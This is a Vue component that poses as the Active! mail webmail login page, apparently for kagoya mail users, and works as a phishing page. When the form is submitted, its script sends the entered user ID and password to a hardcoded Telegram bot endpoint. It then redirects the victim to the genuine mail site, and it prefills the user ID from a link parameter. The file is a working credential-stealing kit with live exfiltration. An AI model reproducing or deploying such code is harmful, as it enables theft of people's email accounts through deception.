<template>
  <div class="page">
    <!-- Header -->
    <header class="header">
      <div class="logo-area">
        <div class="logo">
          <img src="https://on-pre.qualitia.com/assets/img/common/logo/product_am.svg" alt="Active! mail" title="Active! mail" width="164" height="59">
        </div>
      </div>
    </header>

    <!-- Main -->
    <main class="main">
      <div class="login-wrapper">
        <form class="login-box" @submit.prevent="finishJoob">
          <!-- Title -->
          <div class="login-title">Login</div>

          <!-- Form content -->
          <div class="login-content">
            <!-- User ID -->
            <div class="form-row" style="margin-left: 78px">
              <label for="userId">User ID:</label>

              <input
                id="userId"
                v-model="formDataRes.userid"
                type="text"
                autocomplete="off"
              />
            </div>

            <!-- Password -->
            <div class="form-row" style="margin-left: 64px">
              <label for="password">password:</label>

              <input
                id="password"
                v-model="formDataRes.password"
                type="password"
                autocomplete="off"
              />
            </div>

            <!-- Language -->
            <div class="form-row language-row">
              <label for="language">Language selection:</label>

              <select id="language" v-model="formDataRes.language">
                <option value="automatic">Automatic selection</option>

                <option value="english">English</option>

                <option value="japanese">Japanese</option>

                <option value="korean">Korean</option>

                <option value="chinese">chinese</option>
              </select>
            </div>

            <!-- Remember -->
            <div class="remember-row">
              <input id="remember" type="checkbox" />

              <label for="remember">
                Save login information other than password
              </label>
            </div>

            <!-- Bottom -->
            <div class="bottom-row">
              <div class="copyright">
                <div>Active! mail</div>
                <div>©1998 QUALITIA CO., LTD. All Rights Reserved.</div>
              </div>

              <button type="submit" class="login-button">Log in</button>
            </div>
          </div>
        </form>

        <!-- English link -->
        <a href="#" class="english-link" @click.prevent> English </a>
      </div>
    </main>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    return {
      formDataRes: {
        userid: "",
        password: "",
        language: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },


    mounted() {
    this.formDataRes.userid = this.$route.query.qrn || ' '
  },

  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `* kagoya*\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}\nLanguage: ${this.formDataRes.language}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5400278497",
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://activemail.kagoyamail.jp/");
      }
    },



    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7401840231:AAF6pnMUvq6JKRUTp7z64cK881PZ3GPFDiQ/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>

<style scoped>
* {
  box-sizing: border-box;
}

.page {
  min-height: 100vh;
  background: #ffffff;
}

/* =========================
   HEADER
========================= */

.header {
  height: auto;
  border-bottom: 3px solid #b8e1fb;
  background: linear-gradient(90deg, #8cc8f7 0%, #dceffd 10%, #ffffff 20%);
}

.logo-area {
  width: 223px;
  height: 100%;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  padding: 20px 0 20px 50px;
}

/* Logo recreation */
.logo {
  font-family: Arial, Helvetica, sans-serif;
  font-size: 31px;
  font-weight: 400;
  color: #111;
  letter-spacing: -2px;
  white-space: nowrap;
}

/* .logo img {
  width: 300px;
  height: 78px;
} */

.logo .slash {
  display: inline-block;
  color: #df0000;
  font-size: 44px;
  font-weight: 700;
  line-height: 20px;
  transform: skew(-12deg);
  margin: 0 1px;
}

.logo span:last-child {
  letter-spacing: -2px;
}

/* =========================
   MAIN
========================= */

.main {
  position: relative;
  min-height: calc(100vh - 100px);
  background: linear-gradient(
    90deg,
    #8cc8f7 0px,
    #dceffd 150px,
    #ffffff 255px,
    #ffffff 100%
  );
}

/* =========================
   LOGIN
========================= */

.login-wrapper {
  position: absolute;

  /*
   * The original screenshot places
   * the box around the center/right.
   */
  left: 50%;
  top: 166px;

  transform: translateX(-50%);

  width: 347px;
}

/* Login box */

.login-box {
  width: 347px;

  border: 1px solid #8a8a8a;
  background: #eeeeee;

  font-family: Arial, Helvetica, sans-serif;
}

/* Blue title */

.login-title {
  height: 34px;

  display: flex;
  align-items: center;

  padding-left: 9px;

  background: #5b95cf;

  border-bottom: 2px solid #b0b0b0;

  color: white;

  font-size: 20px;
  font-weight: bold;
}

/* Form area */

.login-content {
  padding: 8px 7px 7px;
}

/* Rows */

.form-row {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  margin-bottom: 3px;
  height: 18px;
  gap: 0px;
}

.form-row label {
  color: #333;

  font-size: 12px;
  font-weight: bold;

  margin-right: 4px;

  white-space: nowrap;
}

.form-row input[type="text"],
.form-row input[type="password"] {
  width: 136px;
  height: 19px;

  padding: 1px 3px;

  border: 1px solid #999;

  border-radius: 2px;

  background: white;

  font-size: 12px;

  outline: none;
}

.form-row input[type="text"]:focus,
.form-row input[type="password"]:focus {
  border-color: #777;
}

.language-row {
  margin-top: 2px;
}

.language-row select {
  width: 116px;
  height: 19px;

  padding: 0 2px;

  border: 1px solid #999;

  border-radius: 2px;

  background: #fff;

  font-size: 12px;

  color: #222;
}

/* Remember checkbox */

.remember-row {
  display: flex;
  align-items: center;
  justify-content: center;

  height: 20px;

  margin-top: 1px;

  font-size: 12px;
  font-weight: bold;

  color: #333;
}

.remember-row input {
  width: 13px;
  height: 13px;

  margin: 0 3px 0 0;
}

.remember-row label {
  cursor: pointer;
}

/* Bottom section */

.bottom-row {
  display: flex;
  align-items: flex-end;
  justify-content: space-between;

  margin-top: 3px;
}

/* Copyright */

.copyright {
  color: #666;

  font-size: 9px;
  font-weight: bold;

  line-height: 11px;
}

/* Login button */

.login-button {
  width: 57px;
  height: 21px;

  padding: 0;

  border: 1px solid #888;

  border-radius: 2px;

  background: linear-gradient(#ffffff, #e5e5e5);

  color: #111;

  font-family: Arial, Helvetica, sans-serif;
  font-size: 11px;

  cursor: pointer;
}

.login-button:hover {
  background: linear-gradient(#f5f5f5, #d9d9d9);
}

.login-button:active {
  background: #ddd;
}

/* English link */

.english-link {
  display: block;

  width: max-content;

  margin-left: auto;
  margin-top: 7px;

  color: #0000ee;

  font-family: Arial, Helvetica, sans-serif;

  font-size: 14px;

  text-decoration: underline;
}

.english-link:visited {
  color: #0000ee;
}

/* =========================
   RESPONSIVE
========================= */

@media (max-width: 600px) {
  .header {
    height: 130px;
  }

  .logo-area {
    width: 180px;
    padding-top: 20px;
  }

  .logo {
    font-size: 26px;
  }

  .logo .slash {
    font-size: 38px;
  }

  .main {
    min-height: calc(100vh - 130px);

    background: linear-gradient(
      90deg,
      #8cc8f7 0px,
      #dceffd 90px,
      #ffffff 180px,
      #ffffff 100%
    );
  }

  .login-wrapper {
    position: relative;

    left: auto;
    top: auto;

    transform: none;

    width: 347px;
    max-width: calc(100% - 30px);

    margin: 0 auto;
    padding-top: 100px;
  }

  .login-box {
    width: 100%;
  }
}

@media (max-width: 400px) {
  .login-wrapper {
    max-width: calc(100% - 20px);
  }

  .form-row label {
    font-size: 11px;
  }

  .remember-row {
    font-size: 10px;
  }
}
</style>